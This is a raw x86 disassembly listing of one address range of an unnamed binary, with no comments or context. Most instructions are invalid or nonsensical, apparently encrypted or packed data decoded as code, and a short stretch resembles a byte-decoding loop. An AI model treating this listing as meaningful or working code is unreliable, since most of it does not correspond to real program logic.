  40790e:	sub    BYTE PTR [ecx],dl
  407910:	xchg   esi,eax
  407911:	rcr    DWORD PTR [edx],cl
  407913:	iret   
  407914:	ret    0xd221
  407917:	push   esp
  407918:	(bad)  
  407919:	ja     0x4078c6
  40791b:	neg    DWORD PTR [ecx+0x1c249393]
  407921:	(bad)  
  407922:	mov    bh,0x89
  407924:	mov    eax,0x4dc913cd
  407929:	out    0x1c,eax
  40792b:	jbe    0x407917
  40792d:	call   0xe9d37ec6
  407932:	mov    al,0x91
  407934:	out    dx,eax
  407935:	jmp    0xc2bc:0x3d0a0b5c
  40793c:	loop   0x40798d
  40793e:	ret    0xf8d5
  407941:	popf   
  407942:	add    al,0xed
  407944:	pop    ss
  407945:	add    DWORD PTR [ecx-0x3379709f],ecx
  40794b:	ror    BYTE PTR [ebp-0x2a1bde7e],1
  407951:	inc    edx
  407952:	fcom   QWORD PTR [eax]
  407954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407955:	dec    esi
  407956:	fimul  DWORD PTR [eax+eax*8+0x7e]
  40795a:	(bad)  
  40795b:	pop    eax
  40795c:	hlt    
  40795d:	repz (bad) 
  40795f:	imul   ebx,DWORD PTR [ecx-0x39],0x39
  407963:	dec    edi
  407964:	jmp    0x407989
  407966:	pusha  
  407967:	out    0x98,eax
  407969:	lock lock jl 0x407911
  40796d:	iret   
  40796e:	pop    edi
  40796f:	ds pop esi
  407971:	xchg   ebx,eax
  407972:	(bad)  
  407973:	sahf   
  407974:	mov    edi,0xd8eb23b5
  407979:	dec    ecx
  40797a:	mov    DWORD PTR [ebx],ecx
  40797c:	daa    
  40797d:	shl    DWORD PTR [edi+esi*4],0xd
  407981:	jne    0x40798f
  407983:	dec    ebx
  407984:	cmp    al,bl
  407986:	mov    dh,0x7a
  407988:	pop    edx
  407989:	aaa    
  40798a:	cld    
  40798b:	sbb    BYTE PTR [esi],bh
  40798d:	jnp    0x40791e
  40798f:	cdq    
  407990:	and    cl,bh
  407992:	inc    esp
  407993:	dec    ebp
  407994:	cli    
  407995:	fcmovu st,st(3)
  407997:	mov    bl,0x1f
  407999:	out    0x90,al
  40799b:	xor    DWORD PTR [ebp+0x22],edx
  40799e:	in     eax,dx
  40799f:	push   ebp
  4079a0:	jbe    0x4079fd
  4079a2:	xor    eax,0xb074e95f
  4079a7:	popw   ds
  4079a9:	and    ebx,edx
  4079ab:	dec    esp
  4079ac:	adc    dl,BYTE PTR ds:0xb7731a7c
  4079b2:	mov    bh,0xb0
  4079b4:	int    0x8f
  4079b6:	mov    edi,DWORD PTR [esi+0x30]
  4079b9:	arpl   WORD PTR es:[ebx],sp
  4079bc:	xor    al,0x9c
  4079be:	xor    al,0xc
  4079c0:	and    eax,0x59c4b3b2
  4079c5:	out    0x3b,eax
  4079c7:	pop    ebx
  4079c8:	fadd   st,st(5)
  4079ca:	inc    esp
  4079cb:	lahf   
  4079cc:	lock add esi,DWORD PTR [esi]
  4079cf:	fdiv   DWORD PTR [ecx]
  4079d1:	xchg   esp,ecx
  4079d3:	or     ah,BYTE PTR [eax]
  4079d5:	jle    0x40797f
  4079d7:	les    ebp,FWORD PTR [eax-0x21]
  4079da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079db:	test   BYTE PTR [esi],dl
  4079dd:	pop    esi
  4079de:	push   0x1c
  4079e0:	add    ebx,DWORD PTR [ebx-0x40]
  4079e3:	fsub   st(4),st
  4079e5:	sbb    esp,DWORD PTR [ecx+0x1cc2ff33]
  4079eb:	std    
  4079ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ed:	rol    eax,cl
  4079ef:	adc    eax,DWORD PTR [esi]
  4079f1:	jo     0x40797f
  4079f3:	push   ebx
  4079f4:	pop    ebx
  4079f5:	inc    ebx
  4079f6:	out    0xe1,eax
  4079f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f9:	(bad)  
  4079fa:	sub    esi,DWORD PTR [eax-0x626e4cf9]
  407a00:	sti    
  407a01:	inc    esp
  407a02:	(bad)  
  407a03:	fcom   QWORD PTR [esi-0x3d]
  407a06:	add    BYTE PTR [edi],cl
  407a08:	push   ecx
  407a09:	stos   BYTE PTR es:[edi],al
  407a0a:	dec    edx
  407a0b:	fsub   DWORD PTR [edx+0x2a2ade83]
  407a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a12:	or     ah,BYTE PTR ds:0xe46925b
  407a18:	cdq    
  407a19:	add    al,0xe5
  407a1b:	psubusb mm0,mm3
  407a1e:	pop    es
  407a1f:	sar    BYTE PTR [esi+0x58e10913],0x12
  407a26:	ss dec ebp
  407a28:	es pop edx
  407a2a:	push   ds
  407a2b:	jae    0x4079b3
  407a2d:	jb     0x407aa7
  407a2f:	cdq    
  407a30:	ret    
  407a31:	push   edi
  407a32:	or     dl,dh
  407a34:	inc    ecx
  407a35:	mov    bl,0x4f
  407a37:	rol    BYTE PTR [ebp-0x4c12ba4],cl
  407a3d:	sbb    BYTE PTR [edi-0xea30e04],0x4f
  407a44:	jb     0x4079d7
  407a46:	xchg   esi,eax
  407a47:	xor    al,0x5a
  407a49:	(bad)  
  407a4a:	in     al,0xf4
  407a4c:	mov    ch,0xe3
  407a4e:	jbe    0x407a1a
  407a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a51:	into   
  407a52:	pop    ebp
  407a53:	(bad)  
  407a55:	stos   BYTE PTR es:[edi],al
  407a56:	mov    al,ds:0xa831eef7
  407a5b:	mov    ch,0x69
  407a5d:	mov    esi,0xac974a6
  407a62:	arpl   WORD PTR [eax],di
  407a64:	xchg   ebx,eax
  407a65:	int3   
  407a66:	inc    esp
  407a67:	and    DWORD PTR ds:0x9aeadab6,ebp
  407a6d:	cs std 
  407a6f:	jge    0x407a82
  407a71:	jp     0x407a53
  407a73:	sub    al,0xde
  407a75:	in     al,0xa1
  407a77:	xchg   ebx,esp
  407a79:	shl    BYTE PTR [ebx],1
  407a7b:	inc    ebp
  407a7c:	xchg   al,dl
  407a7e:	out    dx,al
  407a7f:	or     eax,0xe5f03cbb
  407a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a85:	mov    al,ds:0x1dc75bf8
  407a8a:	dec    ebp
  407a8b:	adc    ebx,DWORD PTR [edi]
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	adc    DWORD PTR [ebx+edx*4+0x78db9cd3],eax
  407ac7:	js     0x407b2d
  407ac9:	jle    0x407b43
  407acb:	js     0x407ad1
  407acd:	fbld   TBYTE PTR [eax]
  407acf:	cmp    ebx,ebx
  407ad1:	repz leave 
  407ad3:	cmp    BYTE PTR [eax-0xc872761],ah
  407ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ada:	outs   dx,BYTE PTR ds:[esi]
  407adb:	aad    0x86
  407add:	and    esp,0xffffff9e
  407ae0:	enter  0x717d,0x92
  407ae4:	test   DWORD PTR [esp+esi*1],ebp
  407ae7:	add    bh,dh
  407ae9:	mov    ebp,0x51610ff1
  407aee:	add    ch,BYTE PTR [esi+0x18505ce]
  407af4:	sbb    DWORD PTR [ecx+0x50e1ecd6],edx
  407afa:	addr16 cmp dl,ch
  407afd:	outs   dx,BYTE PTR ds:[esi]
  407afe:	stos   BYTE PTR es:[edi],al
  407aff:	rol    ch,1
  407b01:	pop    eax
  407b02:	pop    ecx
  407b03:	push   eax
  407b04:	lods   eax,DWORD PTR ds:[esi]
  407b05:	in     al,0x8d
  407b07:	mov    ah,0xea
  407b09:	pop    ebx
  407b0a:	clc    
  407b0b:	jnp    0x407ac8
  407b0d:	add    DWORD PTR [esi-0x2f249eb],esp
  407b13:	inc    ebx
  407b14:	pop    ecx
  407b15:	(bad)  
  407b16:	xor    ecx,DWORD PTR [ebp+0x31]
  407b19:	cmp    esp,DWORD PTR [ecx-0x36150aa1]
  407b1f:	add    dl,BYTE PTR [edi]
  407b21:	repnz add ch,dh
  407b24:	dec    edx
  407b25:	ins    BYTE PTR es:[edi],dx
  407b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b27:	mov    BYTE PTR [edx],dl
  407b29:	cdq    
  407b2a:	jnp    0x407ab2
  407b2c:	cdq    
  407b2d:	imul   edi,DWORD PTR [esi-0x37],0xdef7b7f2
  407b34:	or     BYTE PTR [edx],dh
  407b36:	jno    0x407b2d
  407b38:	or     BYTE PTR [eax-0x7a8070dc],0x72
  407b3f:	nop
  407b40:	mov    WORD PTR [edx+0x6],?
  407b43:	mov    al,0xef
  407b45:	jae    0x407baf
  407b47:	scas   eax,DWORD PTR es:[edi]
  407b48:	icebp  
  407b49:	retf   
  407b4a:	xchg   DWORD PTR [edi+0x5c],ebx
  407b4d:	pop    ss
  407b4e:	xchg   esp,eax
  407b4f:	stc    
  407b50:	pop    edi
  407b51:	mov    ds:0x4129c0b,eax
  407b56:	aad    0x6
  407b58:	mov    ecx,0xe8a0eae5
  407b5d:	ret    0x8a4e
  407b60:	and    DWORD PTR [ebx+0x6350ef6],edi
  407b66:	add    bl,BYTE PTR [edi]
  407b68:	stos   DWORD PTR es:[edi],eax
  407b69:	xchg   edx,eax
  407b6a:	pop    ecx
  407b6b:	imul   ebx,DWORD PTR [ecx+ebp*8+0x51],0xffffffb6
  407b70:	(bad)  
  407b71:	adc    edx,ecx
  407b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b74:	pop    eax
  407b75:	outs   dx,BYTE PTR ds:[esi]
  407b76:	push   ecx
  407b77:	pop    ecx
  407b78:	add    eax,edx
  407b7a:	std    
  407b7b:	out    0x49,al
  407b7d:	sbb    al,0x27
  407b7f:	mov    bh,0x11
  407b81:	mov    al,0x78
  407b83:	mov    edx,0x50076b45
  407b88:	inc    esi
  407b89:	sar    edx,0xb0
  407b8c:	pushf  
  407b8d:	out    0x23,al
  407b8f:	pop    ebp
  407b90:	sti    
  407b91:	or     BYTE PTR [edi],ah
  407b93:	std    
  407b94:	pop    DWORD PTR [edi-0x412badd2]
  407b9a:	mov    ch,0x4
  407b9c:	imul   DWORD PTR [ebp+eiz*4-0x4eb86bc6]
  407ba3:	in     al,0xa9
  407ba5:	and    esi,esp
  407ba7:	jmp    0x407b64
  407ba9:	out    0x9,al
  407bab:	pop    edx
  407bac:	test   BYTE PTR [ecx-0x44],al
  407baf:	adc    BYTE PTR [esi+ebx*8],ah
  407bb2:	shl    ah,0xdf
  407bb5:	ins    BYTE PTR es:[edi],dx
  407bb6:	icebp  
  407bb7:	mov    bh,0xc7
  407bb9:	loope  0x407bb5
  407bbb:	pop    ss
  407bbc:	jne    0x407c3a
  407bbe:	dec    ebx
  407bbf:	mov    edi,0x4becfa17
  407bc4:	cmp    BYTE PTR [eax+eax*4+0x20d9eb9f],0xe0
  407bcc:	or     dh,BYTE PTR [ebx]
  407bce:	lods   al,BYTE PTR ds:[esi]
  407bcf:	inc    ebp
  407bd0:	rol    BYTE PTR [eax+0x5a],cl
  407bd3:	xchg   ebp,edi
  407bd5:	arpl   WORD PTR [ebp-0x32],cx
  407bd8:	jne    0x407b9c
  407bda:	jecxz  0x407b6b
  407bdc:	fwait
  407bdd:	shl    DWORD PTR [ebx],cl
  407bdf:	push   esp
  407be0:	sti    
  407be1:	das    
  407be2:	pop    edi
  407be3:	jg     0x407c00
  407be5:	add    ch,BYTE PTR [eax-0x6b]
  407be8:	cmp    al,0xca
  407bea:	mov    ebx,0x901a145
  407bef:	add    bh,BYTE PTR [ebx-0x37]
  407bf2:	add    DWORD PTR [edi],0x18ab52a0
  407bf8:	out    0x1f,eax
  407bfa:	xchg   ebx,eax
  407bfb:	mov    al,0xad
  407bfd:	mov    ebx,DWORD PTR [ecx]
  407bff:	mov    ebp,0x10829c2c
  407c04:	pop    edx
  407c05:	and    BYTE PTR [ecx+0x73],dl
  407c08:	xchg   edi,eax
  407c09:	xor    eax,0x56810163
  407c0e:	jnp    0x407bc5
  407c10:	hlt    
  407c11:	xchg   edx,eax
  407c12:	sbb    eax,0x47d65a6b
  407c17:	sub    DWORD PTR [esi+0x1c],edx
  407c1a:	push   ebp
  407c1b:	fild   WORD PTR [ecx+ebx*2-0x15]
  407c1f:	shl    DWORD PTR [esi+0x18],cl
  407c22:	icebp  
  407c23:	jno    0x407c7f
  407c25:	xor    DWORD PTR [edx-0x12],ebx
  407c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c29:	test   eax,0x9f5c63f3
  407c2e:	xchg   edx,eax
  407c2f:	sbb    dl,BYTE PTR [ebp+edx*4+0x64]
  407c33:	aas    
  407c34:	jle    0x407c95
  407c36:	mov    BYTE PTR [ebx-0x2a],al
  407c39:	retf   0xf0ab
  407c3c:	daa    
  407c3d:	add    al,0x3
  407c3f:	push   ebp
  407c40:	repz xor DWORD PTR [edx+0x4b166c11],0xffffffda
  407c48:	jbe    0x407c2d
  407c4a:	pop    ebp
  407c4b:	sbb    al,0xb5
  407c4d:	mov    esp,0x36787044
  407c52:	pop    ds
  407c53:	jge    0x407be8
  407c55:	clc    
  407c56:	xor    cl,BYTE PTR [esi-0x5e]
  407c59:	jp     0x407c4c
  407c5b:	das    
  407c5c:	lahf   
  407c5d:	leave  
  407c5e:	push   ss
  407c5f:	lds    eax,FWORD PTR [ebx]
  407c61:	ins    BYTE PTR es:[edi],dx
  407c62:	pop    esp
  407c63:	dec    esp
  407c64:	sbb    al,0xe2
  407c66:	fidivr DWORD PTR [edx+0x74854a91]
  407c6c:	cmp    edx,DWORD PTR [eax]
  407c6e:	push   0x3fc8be24
  407c73:	mov    ebp,0x5254a56e
  407c78:	mov    ch,0x19
  407c7a:	addr16 jle 0x407ce8
  407c7d:	or     cl,cl
  407c7f:	push   ebp
  407c80:	push   es
  407c81:	jmp    0x407ce9
  407c83:	stc    
  407c84:	cmc    
  407c85:	pop    ebp
  407c86:	cmp    eax,0x5bcf1f82
  407c8b:	push   es
  407c8c:	outs   dx,DWORD PTR ds:[esi]
  407c8d:	pushf  
  407c8e:	jmp    0x599a32d1
  407c93:	push   ds
  407c94:	or     BYTE PTR [ecx],0x3e
  407c97:	retf   
  407c98:	daa    
  407c99:	je     0x407c63
  407c9b:	jns    0x407d06
  407c9d:	scas   al,BYTE PTR es:[edi]
  407c9e:	retf   
  407c9f:	mov    ds:0x8ecbc95b,al
  407ca4:	xchg   ebx,eax
  407ca5:	sbb    edx,DWORD PTR [esi-0x46]
  407ca8:	int3   
  407ca9:	or     ah,BYTE PTR [eax+0x476783a1]
  407caf:	mov    eax,ds:0x1f91e45c
  407cb4:	retf   
  407cb5:	scas   eax,DWORD PTR es:[edi]
  407cb6:	adc    al,0xc
  407cb8:	loope  0x407d2d
  407cba:	jl     0x407cf8
  407cbc:	mov    ebp,0x87473ee6
  407cc1:	scas   al,BYTE PTR es:[edi]
  407cc2:	lea    ebx,[ecx+eax*8-0x4a]
  407cc6:	adc    eax,0x9e2ced25
  407ccb:	lock xor BYTE PTR [edi-0x7f2e3835],0xe6
  407cd3:	inc    edx
  407cd4:	adc    al,BYTE PTR [edi-0x30]
  407cd7:	xor    al,0xf6
  407cd9:	pop    esp
  407cda:	or     ah,ch
  407cdc:	inc    edi
  407cdd:	int3   
  407cde:	popa   
  407cdf:	mov    es,edi
  407ce1:	dec    edi
  407ce2:	loopne 0x407cb8
  407ce4:	mov    bl,0x42
  407ce6:	call   0xb4548f1c
  407ceb:	mov    edi,0x61ad17df
  407cf0:	mov    edi,0xa02c48c2
  407cf5:	cmp    eax,0xef13d58d
  407cfa:	hlt    
  407cfb:	lahf   
  407cfc:	push   esp
  407cfd:	mov    eax,ds:0xa0480025
  407d02:	fld1   
  407d04:	popf   
  407d05:	sti    
  407d06:	push   ecx
  407d07:	pop    ebx
  407d08:	push   cs
  407d09:	jnp    0x407d04
  407d0b:	jmp    0x407ce0
  407d0d:	push   0x22d9bea2
  407d12:	paddd  mm7,mm0
  407d15:	call   0x86de:0x3890eadc
  407d1c:	xor    DWORD PTR [edx],esi
  407d1e:	cmp    bh,dl
  407d20:	and    bh,BYTE PTR ds:[edx]
  407d23:	sti    
  407d24:	mov    edi,0x21547d90
  407d29:	push   cs
  407d2a:	lods   al,BYTE PTR ds:[esi]
  407d2b:	mov    bh,0x78
  407d2d:	lods   eax,DWORD PTR ds:[esi]
  407d2e:	ins    BYTE PTR es:[edi],dx
  407d2f:	mov    fs,WORD PTR [ebx+0x3852bceb]
  407d35:	pushf  
  407d36:	sub    eax,edi
  407d38:	sbb    BYTE PTR [ecx],ch
  407d3a:	sahf   
  407d3b:	cli    
  407d3c:	add    BYTE PTR [edi+ecx*8+0x111f31e9],dh
  407d43:	jne    0x407db9
  407d45:	dec    edi
  407d46:	push   edx
  407d47:	inc    eax
  407d48:	cdq    
  407d49:	shl    BYTE PTR [ebp+0x77],0x71
  407d4d:	mov    edx,edx
  407d4f:	dec    edx
  407d50:	mov    dh,0xc4
  407d52:	into   
  407d53:	aaa    
  407d54:	not    DWORD PTR [esi-0x1a]
  407d57:	add    al,BYTE PTR [edx-0x50]
  407d5a:	inc    esi
  407d5b:	shr    BYTE PTR ds:0x7f7c9035,0x4d
  407d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d63:	rcl    DWORD PTR [edx-0x71],0x4f
  407d67:	or     edi,ecx
  407d69:	aad    0xd
  407d6b:	ins    DWORD PTR es:[edi],dx
  407d6c:	xor    dh,dl
  407d6e:	inc    ebx
  407d6f:	in     eax,dx
  407d70:	adc    BYTE PTR [ecx],dh
  407d72:	sti    
  407d73:	sub    DWORD PTR [edi+edx*8],0x64
  407d77:	(bad)  
  407d78:	xchg   ebp,eax
  407d79:	dec    ebp
  407d7a:	sar    DWORD PTR [ebp-0x69],1
  407d7d:	dec    ebx
  407d7e:	test   DWORD PTR [ebp-0x29],ecx
  407d81:	cmp    cl,BYTE PTR [ecx+0xa71c271]
  407d87:	ja     0x407d20
  407d89:	push   ebx
  407d8a:	adc    cl,BYTE PTR [esi]
  407d8c:	adc    ebx,DWORD PTR [ebp-0x13c515d2]
  407d92:	xchg   edi,eax
  407d93:	std    
  407d94:	and    BYTE PTR [eax+0x1c],0x5a
  407d98:	push   esi
  407d99:	rcr    DWORD PTR [ecx-0x72e9acd1],1
  407d9f:	push   es
  407da0:	xor    ch,BYTE PTR [edi-0x1231aaa4]
  407da6:	repnz inc ecx
  407da8:	or     al,0x95
  407daa:	pop    ss
  407dab:	cld    
  407dac:	xchg   edx,eax
  407dad:	pop    eax
  407dae:	(bad)  
  407daf:	test   dh,0xb
  407db2:	nop
  407db3:	outs   dx,BYTE PTR ds:[esi]
  407db4:	mov    DWORD PTR [edx],ebx
  407db6:	sbb    BYTE PTR [eax-0x7af02fc5],0xb2
  407dbd:	stc    
  407dbe:	(bad)  
  407dbf:	call   FWORD PTR [edi+0x5b]
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdivr  DWORD PTR [edi]
  407dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ddb:	pop    edi
  407ddc:	push   0xffffff88
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407dab
  407de6:	int    0x28
  407de8:	lods   al,BYTE PTR ds:[esi]
  407de9:	mov    ecx,0xb57965d8
  407dee:	dec    esp
  407def:	stc    
  407df0:	retf   
  407df1:	or     edx,ebx
  407df3:	ficomp DWORD PTR [edi+0x4dfffae9]
  407df9:	mov    WORD PTR [ebp-0x1c],fs
  407dfc:	xor    al,0xea
  407dfe:	mov    al,ds:0x28f45c39
  407e03:	scas   al,BYTE PTR es:[edi]
  407e04:	ja     0x407dd5
  407e06:	cwde   
  407e07:	dec    esi
  407e08:	ret    
  407e09:	outs   dx,BYTE PTR ds:[esi]
  407e0a:	push   eax
  407e0b:	push   ebp
  407e0c:	jle    0x407e65
  407e0e:	adc    cl,dh
  407e10:	fwait
  407e11:	adc    DWORD PTR [edx],0xffffff9b
  407e14:	inc    edx
  407e15:	inc    ebp
  407e16:	sub    ebx,DWORD PTR [eax-0x63]
  407e19:	sub    dl,cl
  407e1b:	iret   
  407e1c:	inc    edx
  407e1d:	mov    dl,0x7
  407e1f:	pusha  
  407e20:	xor    eax,0x3c49e3bd
  407e25:	fld    DWORD PTR [ebx]
  407e27:	push   ebx
  407e28:	fmul   DWORD PTR [esi]
  407e2a:	(bad)  
  407e2b:	mov    ebx,0x6e157e1e
  407e30:	lods   eax,DWORD PTR ds:[esi]
  407e31:	xchg   esi,eax
  407e32:	mov    ecx,0xab56715c
  407e37:	dec    ecx
  407e38:	sar    al,1
  407e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e3b:	mov    ecx,0x782c46fc
  407e40:	or     BYTE PTR [ecx+0x8],dl
  407e43:	hlt    
  407e44:	imul   eax,eax,0x43
  407e47:	jnp    0x407e7b
  407e49:	sar    BYTE PTR [edx+0x64],1
  407e4c:	out    0xf7,eax
  407e4e:	lods   eax,DWORD PTR ds:[esi]
  407e4f:	xor    BYTE PTR [edx],bh
  407e51:	xchg   ebx,eax
  407e52:	mov    ebx,0x30edc5ed
  407e57:	je     0x407e36
  407e59:	xor    eax,0x86cd1dd
  407e5e:	outs   dx,BYTE PTR fs:[esi]
  407e60:	dec    ebp
  407e61:	inc    edx
  407e62:	sub    BYTE PTR [edi],dh
  407e64:	imul   esp,ecx,0x20
  407e67:	out    dx,eax
  407e68:	cmp    dh,BYTE PTR [edx+eax*8+0x3b]
  407e6c:	pop    edx
  407e6d:	fs pop ebp
  407e6f:	stc    
  407e70:	sbb    BYTE PTR [edi-0x4c],dl
  407e73:	in     al,dx
  407e74:	dec    ecx
  407e75:	jns    0x407ecf
  407e77:	jo     0x407e72
  407e79:	ja     0x407e37
  407e7b:	jle    0x407e85
  407e7d:	popa   
  407e7e:	add    BYTE PTR [ebx+edi*4+0x3986ac03],ah
  407e85:	xchg   ebx,eax
  407e86:	sbb    edi,DWORD PTR [ebp+0x45]
  407e89:	xchg   esp,eax
  407e8a:	loopne 0x407e96
  407e8c:	adc    DWORD PTR [esi-0x14],edx
  407e8f:	into   
  407e90:	out    dx,eax
  407e91:	mov    esp,0x1aeedfcf
  407e96:	fstp   TBYTE PTR ds:0x655fab88
  407e9c:	aas    
  407e9d:	outs   dx,BYTE PTR ds:[esi]
  407e9e:	inc    ecx
  407e9f:	inc    edx
  407ea0:	jp     0x407e74
  407ea2:	das    
  407ea3:	sub    ecx,DWORD PTR [eax+edi*2]
  407ea6:	call   0x7d3b:0xa3b6b2bd
  407ead:	mov    esp,ss
  407eaf:	xchg   esi,eax
  407eb0:	ja     0x407f09
  407eb2:	int    0x1
  407eb4:	ror    DWORD PTR [ebx+0x284e8069],0xa6
  407ebb:	dec    esp
  407ebc:	out    0x25,al
  407ebe:	sbb    ch,BYTE PTR [esi+eiz*1]
  407ec1:	cmp    bh,BYTE PTR [edx+0x77c4cfb6]
  407ec7:	xlat   BYTE PTR ds:[ebx]
  407ec8:	pop    es
  407ec9:	loop   0x407e4d
  407ecb:	ret    
  407ecc:	push   es
  407ecd:	(bad)  
  407ece:	add    BYTE PTR [ecx-0x52],dh
  407ed1:	cmp    BYTE PTR [edi+0x5d],0xc9
  407ed5:	jno    0x407ea2
  407ed7:	jmp    0x7070778f
  407edc:	push   ebx
  407edd:	inc    ebx
  407ede:	fiadd  WORD PTR [edx-0x2de1c386]
  407ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee5:	fiadd  WORD PTR [ecx+edx*4]
  407ee8:	or     DWORD PTR [edi],edi
  407eea:	or     eax,0x525a82a0
  407eef:	imul   ebx,ecx,0x80366354
  407ef5:	add    al,bl
  407ef7:	mov    dh,0x8b
  407ef9:	lock leave 
  407efb:	mov    ch,0x97
  407efd:	hlt    
  407efe:	xchg   esi,eax
  407eff:	dec    eax
  407f00:	mov    al,ds:0x3dedb2b0
  407f05:	daa    
  407f06:	adc    BYTE PTR [edx-0x6c],0x6
  407f0a:	sti    
  407f0b:	mov    al,ds:0xbad01a19
  407f10:	lock cmp ecx,DWORD PTR [ecx-0x6e5c59ae]
  407f17:	or     eax,0xcb97892e
  407f1c:	adc    edx,DWORD PTR ds:0x9607636e
  407f22:	pusha  
  407f23:	mov    ch,0xd7
  407f25:	loop   0x407f15
  407f27:	and    BYTE PTR [edi+ebp*1],al
  407f2a:	das    
  407f2b:	push   0xffffff9f
  407f2d:	cmc    
  407f2e:	xchg   ecx,eax
  407f2f:	inc    esi
  407f30:	and    DWORD PTR [edi],ebx
  407f32:	add    al,0x82
  407f34:	and    eax,esp
  407f36:	xor    ch,BYTE PTR [ecx+edx*1]
  407f39:	lock xchg ebp,eax
  407f3b:	mov    esi,0x286c7627
  407f40:	or     bh,BYTE PTR [edx*1-0x42bb1e07]
  407f47:	pop    edx
  407f48:	sub    esp,DWORD PTR [ecx+ecx*2]
  407f4b:	mov    ds:0x3e61ed5,eax
  407f50:	mov    ebp,eax
  407f52:	mov    ecx,0xbc1d75
  407f57:	test   DWORD PTR [edx],esi
  407f59:	adc    eax,0xa890df91
  407f5e:	cmp    eax,0xdeee0c7c
  407f63:	dec    DWORD PTR [ebx-0x21b0a3b5]
  407f69:	or     BYTE PTR [ebp+0x65abda58],ch
  407f6f:	lods   eax,DWORD PTR ds:[esi]
  407f70:	fimul  WORD PTR [esi-0x314d72e1]
  407f76:	imul   esp,DWORD PTR [edx-0xc],0xfffffff5
  407f7a:	in     eax,dx
  407f7b:	push   cs
  407f7c:	dec    ebp
  407f7d:	aam    0x6b
  407f7f:	(bad)  
  407f80:	ins    DWORD PTR es:[edi],dx
  407f81:	jne    0x407f69
  407f83:	arpl   WORD PTR [ecx-0xf],bx
  407f86:	imul   esi,DWORD PTR [ebp-0x7b34a046],0x57
  407f8d:	push   0xc912fc82
  407f92:	push   ss
  407f93:	test   eax,0x79247ac8
  407f98:	add    al,0x50
  407f9a:	jp     0x407f2d
  407f9c:	daa    
  407f9d:	adc    BYTE PTR [ebp-0x72e6aeaf],ch
  407fa3:	mov    esp,0xa129899a
  407fa8:	mov    ebx,0xa0d7dc1
  407fad:	mov    dl,0xbe
  407faf:	int    0x60
  407fb1:	adc    al,0x92
  407fb3:	int3   
  407fb4:	rol    BYTE PTR [ebx-0x80],0xf2
  407fb8:	lahf   
  407fb9:	sbb    al,0xb
  407fbb:	adc    BYTE PTR [esi],bh
  407fbd:	stos   BYTE PTR es:[edi],al
  407fbe:	fsubr  DWORD PTR [ebp+0x7f1840c3]
  407fc4:	test   al,0x74
  407fc6:	sbb    ebp,ebx
  407fc8:	and    eax,0x8d874215
  407fcd:	pop    ebx
  407fce:	dec    ebp
  407fcf:	jle    0x408030
  407fd1:	js     0x408035
  407fd3:	in     eax,dx
  407fd4:	push   ds
  407fd5:	inc    esi
  407fd6:	fnstsw WORD PTR [edi]
  407fd8:	fdivr  QWORD PTR [edx+edx*4+0x4e85e74b]
  407fdf:	mov    bh,0xdb
  407fe1:	test   eax,0xf9a9b34a
  407fe6:	mov    eax,0xcebc94fa
  407feb:	mov    al,ds:0x11c7aeaf
  407ff0:	jp     0x407fce
  407ff2:	jg     0x407f82
  407ff4:	(bad)  [eax]
  407ff6:	mov    es,edi
  407ff8:	inc    esi
  407ff9:	pop    es
  407ffa:	popf   
  407ffb:	add    al,0x11
  407ffd:	or     al,0x8
  407fff:	scas   eax,DWORD PTR es:[edi]
  408000:	mov    eax,ds:0x7513c444
  408005:	jb     0x407f9b
  408007:	jb     0x408056
  408009:	neg    DWORD PTR [ebx-0x14]
  40800c:	int3   
  40800d:	daa    
  40800e:	lds    esp,FWORD PTR ds:[esi-0x1eee17b2]
  408015:	cmp    BYTE PTR [edi+0x52f6db18],0x4a
  40801c:	jle    0x408078
  40801e:	mov    BYTE PTR [ecx+0x5ad19ee4],ah
  408024:	mov    ebx,0xf6481548
  408029:	arpl   ax,dx
  40802b:	loop   0x407fb6
  40802d:	push   ecx
  40802e:	lods   al,BYTE PTR ds:[esi]
  40802f:	add    ecx,DWORD PTR [esi+0x41]
  408032:	ret    0x3dd0
  408035:	sbb    al,0x97
  408037:	jmp    0x407ffa
  408039:	mov    al,ds:0x40120c9c
  40803e:	inc    ebp
  40803f:	cs out dx,al
  408041:	mov    dh,0x97
  408043:	pushf  
  408044:	sbb    BYTE PTR [esp+ecx*2+0x626265f8],cl
  40804b:	add    eax,0x75f358c1
  408050:	fnstenv [ebx]
  408052:	in     eax,0x9e
  408054:	ret    
  408055:	sbb    edi,DWORD PTR [edi]
  408057:	loopne 0x408047
  408059:	xor    DWORD PTR [edi+0x58],edx
  40805c:	jbe    0x408000
  40805e:	hlt    
